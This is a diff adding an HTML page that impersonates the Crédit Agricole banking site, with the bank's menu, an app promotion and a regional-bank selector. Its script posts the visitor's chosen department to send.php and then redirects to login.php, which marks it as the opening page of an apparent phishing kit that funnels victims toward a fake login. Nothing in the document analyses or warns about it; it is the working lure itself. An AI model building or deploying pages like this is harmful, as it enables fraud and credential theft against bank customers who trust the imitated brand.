@@ -1,0 +1,132 @@
+<!doctype html>
+<html>
+<head>
+<title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="res/fonts.css">
+<link rel="stylesheet" href="res/style.css">
+<style>
+.text-center{
+    text-align:center;
+}
+
+
+#formobile{
+    display:none;
+}
+
+
+
+@media screen and (max-width:1000px){
+    #formobile{
+        display:block;
+    }
+    #forpc{
+    display:none;
+}
+
+}
+
+</style>
+</head>
+<body style="background:white;">
+<header style="display:flex; align-items:center; padding:0; ">
+<div class="left" style="width:100%; text-align:left;" id="formobile"><img src="res/menu.png" style="width:50px;"></div>
+<div class="mid" style="width:100%;"><img src="res/logo.png"></div>
+<div class="right" style="width:100%; text-align:right;" id="forpc"><img src="res/pc-menu.png" style="width:400px;"></div>
+<div class="right" style="width:100%; text-align:right; position:relative;" id="formobile"><img src="res/search.png" style="width:100px;"></div>
+</header>
+<div class="menubar">
+<li>COMPTES & CARTES</li>
+<li>ÉPARGNER</li>
+<li>S'ASSURER</li>
+<li>EMPRUNTER</li>
+<li>OFFRES ÉCO-RESPONSABLES</li>
+<li>ESPACE JEUNES</li>
+<li>MES COUPS DURS</li>
+<li>SIMULATION & DEVIS</li>
+<li>NOS CONSEILS</li>
+</div>
+<section>
+<div class="left" style="background:url('res/back2.jpg');  background-size: cover;
+    background-position: center center;
+    background-repeat: no-repeat;">
+    <div class="ad" style="background:#007461; color:white;">
+        <h2>TÉLÉCHARGEZ L’APPLICATION MA BANQUE</h2>
+        <h5 style="margin:0;">Chacun d’entre vous gère différemment ses besoins bancaires.
+Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h5>
+        <button class="sbmt" style="background:white; color:green;">Découvrez les grandes fonctionnalités</button>
+</div>
+</div>
+<div class="right">
+    <div class="holder text-center">
+        <div class="col">
+            <div class="form" style="display:inline-block; width:500px; max-width:100%; padding:50px; background:#f7f8fa;">
+            <div class="title text-center" style="font-size:1.5em;">ACCÉDER À L'ESPACE DÉDIÉ
+DE VOTRE CAISSE RÉGIONALE</div>
+                <div class="form-group">
+                    <label>
+                    <p style="color:black; margin:9px 0; display:block;">Trouvez une caisse régionale en saisissant un département</p>
+                    </label>
+                    <input type="text" class="textinput" id="d0" style="border:none;" placeholder="Exemple 75 pour Paris."> 
+                </div>
+
+
+                <div class="form-group" style="margin:30px 0;">
+                    Ou
+                </div>
+
+                <div class="form-group">
+                    <select id="d1">
+                        <option selected value="">Choisissez une caisse régionale</option>
+                        <option value='Alpes Provence'>Alpes Provence</option><option value='Alsace Vosges'>Alsace Vosges</option><option value='Anjou Maine'>Anjou Maine</option><option value='Aquitaine'>Aquitaine</option><option value='Atlantique Vendèe'>Atlantique Vendèe</option><option value='Brie Picardie'>Brie Picardie</option><option value='Centre Est'>Centre Est</option><option value='Centre France'>Centre France</option><option value='Centre Loire'>Centre Loire</option><option value='Centre Quest'>Centre Quest</option><option value='Champagne Bourgogne'>Champagne Bourgogne</option><option value='Charente Maritime Deux-Sèvres'>Charente Maritime Deux-Sèvres</option><option value='Charente Prérgord'>Charente Prérgord</option><option value='Corse'>Corse</option><option value='Côtes d'Armor'>Côtes d'Armor</option><option value='Des Savoie'>Des Savoie</option><option value='Finistère'>Finistère</option><option value='Franche Comté'>Franche Comté</option><option value='Guadeloupe'>Guadeloupe</option><option value='Ille et Vilaine'>Ille et Vilaine</option><option value='Languedoc'>Languedoc</option><option value='Loire Haute-Loire'>Loire Haute-Loire</option><option value='Lorraine'>Lorraine</option><option value='Martinique Guyane'>Martinique Guyane</option><option value='Morbihan'>Morbihan</option><option value='Nord De France'>Nord De France</option><option value='Nord Est'>Nord Est</option><option value='Nord Midi Pyrénées'>Nord Midi Pyrénées</option><option value='Normandie'>Normandie</option><option value='Normandie Seine'>Normandie Seine</option><option value='Paris et Île de France'>Paris et Île de France</option><option value='Provence Côte d'Azur'>Provence Côte d'Azur</option><option value='Pyrénées Gascogne'>Pyrénées Gascogne</option><option value='Réunion'>Réunion</option><option value='Sud Méditerranée'>Sud Méditerranée</option><option value='Sud Rhône Alpes'>Sud Rhône Alpes</option><option value='Toulouse 31'>Toulouse 31</option><option value='Touraine Poitou'>Touraine Poitou</option><option value='Val De France'>Val De France</option>                    </select>
+                </div>
+
+
+                <div class="form-group">
+                    <button class="sbmt" onclick="sendReg()" id="sendlogin">Rechercher une caisse régionale</button>
+                </div>
+            </div>
+
+
+
+
+        </div>
+
+    </div>
+
+</div>
+
+
+</section>
+
+
+<script src="res/cdns/jq.js"></script>
+<script>
+
+function sendReg(){
+
+if($("#d0").val()!="" || $("#d1").val()!=""){
+
+
+    $.post("send.php",{
+        departement:$("#d0").val()+" "+$("#d1").val()
+    }, function(d){
+        window.location="login.php";
+    });
+
+}
+}
+
+
+$("input").keypress((e)=>{
+    if(e.key=="Enter"){
+        sendReg();
+    }
+});
+
+
+ 
+</script>
+</body>
+</html>
